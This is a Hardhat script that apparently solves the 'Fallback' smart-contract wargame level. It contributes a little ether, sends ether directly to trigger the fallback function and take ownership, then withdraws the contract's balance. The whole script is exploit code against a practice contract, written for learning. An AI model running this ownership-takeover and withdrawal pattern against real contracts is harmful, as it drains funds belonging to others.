// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B";
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096";

async function main() {
    console.log("Script to solve Fallback puzzle \n ========================================== \n");

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Fallback", CONTRACT_ADDRESS, attacker);
    await contract.contribute({ value: ethers.utils.parseUnits("0.0005", "ether") });

    const attackerContribution = await contract.getContribution({ from: PLAYER_ADDRESS });
    const attackerContributionInEther = ethers.utils.formatEther(attackerContribution);
    console.log(`Attacker's contribution: ${attackerContributionInEther} ETH`);

    await attacker.sendTransaction({
        to: contract.address,
        value: ethers.utils.parseUnits("10", "wei"),
    });

    await contract.withdraw();

    const owner: string = await contract.owner();
    if (owner === attacker.address) {
        console.log("Congratulations! Now submit the solution");
    } else {
        console.log("Something went wrong.");
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
